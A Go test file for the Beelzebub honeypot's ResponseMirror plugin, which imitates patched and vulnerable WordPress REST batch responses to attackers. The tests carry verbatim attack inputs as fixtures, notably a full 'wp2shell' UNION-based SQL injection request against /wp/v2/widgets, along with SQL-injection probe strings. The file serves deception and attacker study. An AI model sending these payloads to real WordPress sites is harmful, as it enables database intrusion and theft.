package plugins

import (
	"encoding/json"
	"regexp"
	"strings"
	"testing"

	"github.com/beelzebub-labs/beelzebub/v3/internal/parser"
	"gopkg.in/yaml.v3"
)

// TestMirror_YAMLRoundTrip unmarshals a mirror command straight from YAML (the
// deployment path), compiles it through the real parser, and asserts the
// plugin produces the golden bytes. This guards the yaml struct tags — a tag
// typo would pass the struct-built tests above but silently break on a real
// lure config, which is the fork's classic "unknown key ignored" failure mode.
func TestMirror_YAMLRoundTrip(t *testing.T) {
	const y = `
commands:
  - regex: "^/wp-json/batch/v1/?$"
    method: "POST"
    plugin: "ResponseMirror"
    statusCode: 207
    handler: "{}"
    mirror:
      requestKey: requests
      responseKey: responses
      wrapStatus: 207
      pathField: path
      methodField: method
      maxItems: 25
      allowedMethods: [POST, PUT, PATCH, DELETE]
      reject:
        status: 400
        body: '{"code":"rest_invalid_param"}'
      rules:
        - pathRegex: '^https?:'
          status: 400
          body: '{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}}'
          headers: '[]'
        - pathRegex: '/wp/v2/posts$'
          status: 401
          body: '{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}}'
          headers: '{"Allow":"GET"}'
        - pathRegex: '/batch/v1$'
          status: 400
          body: '{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}}'
          headers: '{"Allow":"POST"}'
      default:
        status: 404
        body: '{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}'
        headers: '[]'
`
	var conf parser.BeelzebubServiceConfiguration
	if err := yaml.Unmarshal([]byte(y), &conf); err != nil {
		t.Fatalf("yaml unmarshal: %v", err)
	}
	if err := conf.CompileCommandRegex(); err != nil {
		t.Fatalf("compile: %v", err)
	}
	m := conf.Commands[0].Mirror
	if m == nil {
		t.Fatal("mirror did not unmarshal (yaml tag mismatch on `mirror`)")
	}
	if len(m.Rules) != 3 || m.Rules[0].PathRegex == nil {
		t.Fatalf("rules did not unmarshal/compile: %+v", m.Rules)
	}
	req := `{"requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/batch/v1"}]}`
	want := `{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}},"status":401,"headers":{"Allow":"GET"}},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":{"Allow":"POST"}}]}`
	status, body, ok := MirrorRespond(m, []byte(req))
	if !ok || status != 207 || body != want {
		t.Fatalf("ok=%v status=%d\n got=%s\nwant=%s", ok, status, body, want)
	}
}

// wpMirror builds the WordPress-6.9.5 (patched) rule table used by the tests.
// The bodies/statuses/headers are the byte-exact values captured from a real
// wordpress:6.9.4 container updated to 6.9.5 (tools/oracle-diff in honeypot-
// research). Regexes are compiled here directly rather than through the parser
// so the test targets MirrorRespond's assembly precisely.
func wpMirror() *parser.MirrorConfig {
	rule := func(re, method string, status int, body, headers string) parser.MirrorRule {
		return parser.MirrorRule{
			PathRegexStr: re,
			PathRegex:    regexp.MustCompile(re),
			Method:       method,
			MirrorElement: parser.MirrorElement{
				Status: status, Body: body, Headers: headers,
			},
		}
	}
	return &parser.MirrorConfig{
		RequestKey:     "requests",
		ResponseKey:    "responses",
		WrapStatus:     207,
		PathField:      "path",
		MethodField:    "method",
		AllowedMethods: []string{"POST", "PUT", "PATCH", "DELETE"},
		Reject: &parser.MirrorReject{
			Status: 400,
			Body:   `{"code":"rest_invalid_param","message":"Invalid parameter(s): requests","data":{"status":400,"params":{"requests":"requests[0][method] is not one of POST, PUT, PATCH, and DELETE."},"details":{"requests":{"code":"rest_not_in_enum","message":"requests[0][method] is not one of POST, PUT, PATCH, and DELETE.","data":null}}}}`,
		},
		Rules: []parser.MirrorRule{
			rule(`^https?:`, "", 400, `{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}}`, `[]`),
			rule(`/wp/v2/posts$`, "", 401, `{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}}`, `{"Allow":"GET"}`),
			rule(`/wp/v2/users$`, "", 400, `{"code":"rest_missing_callback_param","message":"Missing parameter(s): username, email, password","data":{"status":400,"params":["username","email","password"]}}`, `{"Allow":"GET"}`),
			rule(`/wp/v2/block-renderer`, "", 400, `{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}}`, `[]`),
			rule(`/batch/v1$`, "", 400, `{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}}`, `{"Allow":"POST"}`),
		},
		Default: parser.MirrorElement{
			Status: 404, Body: `{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}`, Headers: `[]`,
		},
	}
}

// GOLDEN is the byte-exact body captured from patched WP 6.9.5 for a batch with
// all six top-level element types in order (Content-Length: 994).
const goldenAllTypes = `{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}},"status":401,"headers":{"Allow":"GET"}},{"body":{"code":"rest_missing_callback_param","message":"Missing parameter(s): username, email, password","data":{"status":400,"params":["username","email","password"]}},"status":400,"headers":{"Allow":"GET"}},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":[]},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":{"Allow":"POST"}},{"body":{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}},"status":404,"headers":[]}]}`

func TestMirror_GoldenAllTypes(t *testing.T) {
	req := `{"requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/wp/v2/users"},{"method":"POST","path":"/wp/v2/block-renderer/core/archives"},{"method":"POST","path":"/batch/v1"},{"method":"POST","path":"/wp/v2/does-not-exist"}]}`
	status, body, ok := MirrorRespond(wpMirror(), []byte(req))
	if !ok || status != 207 {
		t.Fatalf("ok=%v status=%d", ok, status)
	}
	if body != goldenAllTypes {
		t.Fatalf("body mismatch\n got: %s\nwant: %s", body, goldenAllTypes)
	}
	if len(body) != 994 {
		t.Fatalf("Content-Length: got %d want 994", len(body))
	}
}

func TestMirror_SingleElementAndNoTrailingNewline(t *testing.T) {
	status, body, ok := MirrorRespond(wpMirror(), []byte(`{"requests":[{"method":"POST","path":"/wp/v2/posts"}]}`))
	want := `{"responses":[{"body":{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}},"status":401,"headers":{"Allow":"GET"}}]}`
	if !ok || status != 207 || body != want {
		t.Fatalf("ok=%v status=%d body=%s", ok, status, body)
	}
	if body[len(body)-1] == '\n' {
		t.Fatalf("body must not end with a newline (real WP does not)")
	}
}

// The Operator A seq6 payload (also the byte-identical 31.58.244.30 body):
// nested sub-request bodies must be IGNORED (flat / patched behaviour).
func TestMirror_OperatorA_seq6_FlatIgnoresNested(t *testing.T) {
	req := `{"requests":[{"method":"POST","path":"http://:"},{"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/wp/v2/block-renderer/core/archives"},{"method":"POST","path":"/batch/v1","body":{"requests":[]}}]}`
	want := `{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}},"status":401,"headers":{"Allow":"GET"}},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":[]},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":{"Allow":"POST"}}]}`
	status, body, ok := MirrorRespond(wpMirror(), []byte(req))
	if !ok || status != 207 || body != want {
		t.Fatalf("ok=%v status=%d\n got=%s\nwant=%s", ok, status, body, want)
	}
}

// Operator B (wp2shell) UNION payload: the nested widgets SQLi is ignored; the
// top-level shape is [scheme, /wp/v2/posts, /batch/v1].
func TestMirror_OperatorB_wp2shell(t *testing.T) {
	req := `{"requests":[{"method":"POST","path":"http://:"},{"body":{"requests":[{"method":"GET","path":"/wp/v2/widgets?author_exclude=1) UNION ALL SELECT ..."}]},"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/batch/v1"}]}`
	status, body, ok := MirrorRespond(wpMirror(), []byte(req))
	want := `{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}},"status":401,"headers":{"Allow":"GET"}},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":{"Allow":"POST"}}]}`
	if !ok || status != 207 || body != want {
		t.Fatalf("ok=%v status=%d\n got=%s\nwant=%s", ok, status, body, want)
	}
}

func TestMirror_MethodGuardRejectsWholeBatch(t *testing.T) {
	// A top-level GET is outside the enum → whole-envelope 400, not a 207.
	status, body, ok := MirrorRespond(wpMirror(), []byte(`{"requests":[{"method":"GET","path":"/wp/v2/posts"}]}`))
	if !ok || status != 400 {
		t.Fatalf("ok=%v status=%d", ok, status)
	}
	want := `{"code":"rest_invalid_param","message":"Invalid parameter(s): requests","data":{"status":400,"params":{"requests":"requests[0][method] is not one of POST, PUT, PATCH, and DELETE."},"details":{"requests":{"code":"rest_not_in_enum","message":"requests[0][method] is not one of POST, PUT, PATCH, and DELETE.","data":null}}}}`
	if body != want {
		t.Fatalf("reject body mismatch: %s", body)
	}
}

func TestMirror_FallsBackWhenNotABatch(t *testing.T) {
	// ok=false means the caller keeps the static handler — strictly additive.
	cases := []string{
		``,                              // empty
		`not json`,                      // unparseable
		`{"foo":"bar"}`,                 // no requests key
		`{"requests":"notarray"}`,       // requests not an array
		`[]`,                            // top-level array, not object
	}
	for _, c := range cases {
		if _, _, ok := MirrorRespond(wpMirror(), []byte(c)); ok {
			t.Fatalf("expected ok=false for %q", c)
		}
	}
}

func TestMirror_NilConfig(t *testing.T) {
	if _, _, ok := MirrorRespond(nil, []byte(`{"requests":[]}`)); ok {
		t.Fatalf("nil config must return ok=false")
	}
}

func TestMirror_MaxItemsGuard(t *testing.T) {
	// 26 sub-requests (> default 25) → reject (configured) fires.
	req := `{"requests":[`
	for i := 0; i < 26; i++ {
		if i > 0 {
			req += ","
		}
		req += `{"method":"POST","path":"/wp/v2/posts"}`
	}
	req += `]}`
	status, _, ok := MirrorRespond(wpMirror(), []byte(req))
	if !ok || status != 400 {
		t.Fatalf("maxItems guard: ok=%v status=%d", ok, status)
	}
}

// compileMirror runs through the real parser path to prove a config with
// invalid JSON fragments is rejected at load, not on the wire.
func TestMirror_ParserValidatesJSON(t *testing.T) {
	good := parser.BeelzebubServiceConfiguration{Commands: []parser.Command{{
		Name: "batch", Plugin: ResponseMirrorName,
		Mirror: &parser.MirrorConfig{
			RequestKey: "requests", ResponseKey: "responses", WrapStatus: 207,
			Rules:   []parser.MirrorRule{{PathRegexStr: `/x$`, MirrorElement: parser.MirrorElement{Status: 404, Body: `{"ok":true}`, Headers: `[]`}}},
			Default: parser.MirrorElement{Status: 404, Body: `{"code":"rest_no_route"}`, Headers: `[]`},
		},
	}}}
	if err := good.CompileCommandRegex(); err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}
	bad := good
	bad.Commands = []parser.Command{{
		Name: "batch", Plugin: ResponseMirrorName,
		Mirror: &parser.MirrorConfig{
			RequestKey: "requests", ResponseKey: "responses", WrapStatus: 207,
			Default: parser.MirrorElement{Status: 404, Body: `{not valid json`, Headers: `[]`},
		},
	}}
	if err := bad.CompileCommandRegex(); err == nil {
		t.Fatalf("expected invalid-JSON body to fail config load")
	}
}

// wpVulnMirror is the VULNERABLE-6.9.4 rule table: recurse nested batches and
// reflect a wp2shell UNION marker into the forged row, so a marker-checking
// scanner sees "success" and proceeds to its next stage. Byte-exact target =
// tools/oracle-diff/wordpress-6.9.4/exploit_B_union_marker.txt (honeypot-research).
func wpVulnMirror() *parser.MirrorConfig {
	el := func(status int, body, headers string) parser.MirrorElement {
		return parser.MirrorElement{Status: status, Body: body, Headers: headers}
	}
	rule := func(re, method string, e parser.MirrorElement) parser.MirrorRule {
		return parser.MirrorRule{PathRegexStr: re, PathRegex: regexp.MustCompile(re), Method: method, MirrorElement: e}
	}
	parse := `{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}}`
	notAllowed := `{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}}`
	invalidHandler := `{"code":"rest_invalid_handler","message":"The handler for the route is invalid","data":{"status":500}}`
	forged := `[{"id":1922721457,"guid":{"rendered":""},"slug":"${reflect}","title":{"rendered":""},"content":{"rendered":"","protected":false}}]`
	rowHdr := `{"X-WP-Total":1,"X-WP-TotalPages":-1,"Allow":"GET"}`
	markerRe := `COALESCE(?:%28|\()(?:%28|\()SELECT(?:%2B|\+| )0x([0-9a-fA-F]+)`

	widgetsMarker := rule(`/wp/v2/widgets.*COALESCE`, "", el(200, forged, rowHdr))
	widgetsMarker.Reflect = &parser.MirrorReflect{FromRegexStr: markerRe, FromRegex: regexp.MustCompile(markerRe), Decode: "hex"}

	return &parser.MirrorConfig{
		RequestKey: "requests", ResponseKey: "responses", WrapStatus: 207,
		PathField: "path", MethodField: "method", MaxItems: 25,
		Recurse: &parser.MirrorRecurse{Status: 207, Headers: `{"Allow":"POST"}`},
		Rules: []parser.MirrorRule{
			rule(`^https?:`, "", el(400, parse, `[]`)),
			widgetsMarker,
			rule(`/wp/v2/widgets.*WHERE(?:%28|\()(?:%20| )*1%3D1`, "", el(200, `[{"id":1922721457}]`, rowHdr)),
			rule(`/wp/v2/widgets.*WHERE(?:%28|\()(?:%20| )*1%3D2`, "", el(200, `[]`, `{"X-WP-Total":0,"X-WP-TotalPages":0,"Allow":"GET"}`)),
			rule(`/wp/v2/posts$`, "GET", el(500, invalidHandler, `[]`)),
			rule(`/wp/v2/posts$`, "POST", el(401, `{"code":"rest_cannot_create","message":"Sorry, you are not allowed to create posts as this user.","data":{"status":401}}`, `{"Allow":"GET"}`)),
			// vulnerable 6.9.4 returns [] here (patched 6.9.5 returns {"Allow":"POST"})
			rule(`/batch/v1$`, "", el(400, notAllowed, `[]`)),
		},
		Default: el(404, `{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}`, `[]`),
	}
}

// the verbatim wp2shell B1 request body (marker 35667ba4eb25), and B2 (c94504763929)
func wp2shellBody(markerHex string) string {
	return `{"requests":[{"method":"POST","path":"http://:"},{"body":{"requests":[{"method":"GET","path":"http://:"},{"method":"GET","path":"/wp/v2/widgets?_fields=id%2Cslug%2Ctitle%2Ccontent%2Cguid&author_exclude=1%29+AND+1%3D0+UNION+ALL+SELECT+1922721457%2C1%2C0x30%2C0x30%2C%27%27%2C%27%27%2C%27%27%2C0x7075626c697368%2C0x636c6f736564%2C0x636c6f736564%2C%27%27%2CCOALESCE%28%28SELECT+0x` + markerHex + `%29%2C%27%27%29%2C%27%27%2C%27%27%2C0x30%2C0x30%2C%27%27%2C0%2C%27%27%2C0%2C0x706f7374%2C%27%27%2C0+--+-&context=view&orderby=none&page=-1&per_page=-1"},{"method":"GET","path":"/wp/v2/posts"}]},"method":"POST","path":"/wp/v2/posts"},{"method":"POST","path":"/batch/v1"}]}`
}

func TestMirror_VulnReproduction_ByteExact(t *testing.T) {
	// marker 35667ba4eb25 hex-encoded == 0x333536363762613465623235
	body := wp2shellBody("333536363762613465623235")
	want := `{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":{"responses":[{"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},{"body":[{"id":1922721457,"guid":{"rendered":""},"slug":"35667ba4eb25","title":{"rendered":""},"content":{"rendered":"","protected":false}}],"status":200,"headers":{"X-WP-Total":1,"X-WP-TotalPages":-1,"Allow":"GET"}},{"body":{"code":"rest_invalid_handler","message":"The handler for the route is invalid","data":{"status":500}},"status":500,"headers":[]}]},"status":207,"headers":{"Allow":"POST"}},{"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":[]}]}`
	status, got, ok := MirrorRespond(wpVulnMirror(), []byte(body))
	if !ok || status != 207 {
		t.Fatalf("ok=%v status=%d", ok, status)
	}
	if got != want {
		t.Fatalf("byte mismatch\n got: %s\nwant: %s", got, want)
	}
}

func TestMirror_VulnReflection_IsDynamicNotHardcoded(t *testing.T) {
	// A DIFFERENT marker (c94504763929) must reflect that value, not a constant.
	status, got, ok := MirrorRespond(wpVulnMirror(), []byte(wp2shellBody("633934353034373633393239")))
	if !ok || status != 207 {
		t.Fatalf("ok=%v status=%d", ok, status)
	}
	if !strings.Contains(got, `"slug":"c94504763929"`) {
		t.Fatalf("expected reflected marker c94504763929 in slug, got: %s", got)
	}
	if strings.Contains(got, "35667ba4eb25") {
		t.Fatalf("stale/hardcoded marker leaked")
	}
}

func TestMirror_VulnReflection_HostileMarkerIsSafe(t *testing.T) {
	// A marker that hex-decodes to JSON-breaking bytes must be escaped, keeping
	// the response valid JSON (no injection via the reflection).
	// 0x22 = '"'  -> would break the string if not escaped.
	status, got, ok := MirrorRespond(wpVulnMirror(), []byte(wp2shellBody("22")))
	if !ok || status != 207 {
		t.Fatalf("ok=%v status=%d", ok, status)
	}
	var v any
	if err := json.Unmarshal([]byte(got), &v); err != nil {
		t.Fatalf("reflection broke JSON validity: %v\n%s", err, got)
	}
}

func TestMirror_VulnRecursion_DepthAndBudgetBounded(t *testing.T) {
	// A pathological deeply-nested body must not amplify unboundedly; it falls
	// back (ok=false) once the element budget is exhausted.
	cfg := wpVulnMirror()
	cfg.MaxTotal = 5
	// one node recursing into a WIDE nested array (30 leaves) — 1 + 30 > budget,
	// within maxDepth — so the element budget, not the depth cap, stops it.
	leaves := ""
	for i := 0; i < 30; i++ {
		if i > 0 {
			leaves += ","
		}
		leaves += `{"method":"POST","path":"/x"}`
	}
	body := `{"requests":[{"method":"POST","path":"/wp/v2/posts","body":{"requests":[` + leaves + `]}}]}`
	_, _, ok := MirrorRespond(cfg, []byte(body))
	if ok {
		t.Fatalf("expected ok=false (budget exhausted) for pathological nesting")
	}
}

func TestEvalLiteralBool(t *testing.T) {
	cases := []struct {
		in      string
		val     bool
		lit     bool
	}{
		{"1=1", true, true},
		{"1=0", false, true},
		{"(1=1)", true, true},   // one paren layer stripped
		{"2=2", true, true},
		{"1<>2", true, true},
		{"1!=1", false, true},
		{"5>3", true, true},
		{"3>=3", true, true},
		{"3>5", false, true},
		{"'a'='a'", true, true},
		{"'admin'='root'", false, true},
		{"true", true, true},
		{"false", false, true},
		{"1", true, true},
		{"0", false, true},
		{"'a'>'b'", false, false},                 // string ordering → flat
		{"1='1'", false, false},                   // mixed type → flat
		{"1=1 AND 2=2", false, false},             // connective → flat
		{"SUBSTRING(user_pass,1,1)='a'", false, false}, // column ref → flat
		{"ASCII(MID(@@version,1,1))>52", false, false}, // fn+var → flat
		{"(SELECT 0x41)", false, false},           // subquery → flat
		{"user_id=1", false, false},               // identifier → flat
		{"", false, false},
		{"garbage", false, false},
	}
	for _, c := range cases {
		val, lit := evalLiteralBool(c.in)
		if lit != c.lit || (lit && val != c.val) {
			t.Errorf("evalLiteralBool(%q) = (%v,%v), want (%v,%v)", c.in, val, lit, c.val, c.lit)
		}
	}
}
